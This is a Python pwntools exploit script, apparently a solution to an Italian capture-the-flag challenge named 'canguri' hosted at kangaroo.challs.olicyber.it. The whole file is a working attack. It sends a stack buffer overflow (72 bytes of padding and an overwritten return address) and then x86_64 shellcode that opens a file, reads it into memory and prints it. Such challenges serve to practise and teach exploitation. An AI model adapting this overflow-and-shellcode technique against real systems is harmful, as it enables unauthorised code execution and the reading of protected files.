from pwn import *

BUFFER = 0x4040c0

SHELLCODE = asm(f"""
    mov rax, 2
    lea rdi, [0x4020b5]
    mov rsi, 0
    syscall
                
    mov rdi, rax
    mov rax, 0
    mov rsi, {BUFFER}
    mov rdx, 40
    syscall
                
    mov rax, 1
    mov rdi, 1
    mov rsi, {BUFFER}
    syscall""", arch="x86_64")

# r = process("./canguri")
r = remote("kangaroo.challs.olicyber.it", 20005)

PAYLOAD = b"a" * 72 + p64(0x4040c0)

r.sendlineafter(b"binari?", PAYLOAD)
r.sendlineafter(b"protezioni.\n", SHELLCODE)

r.interactive()
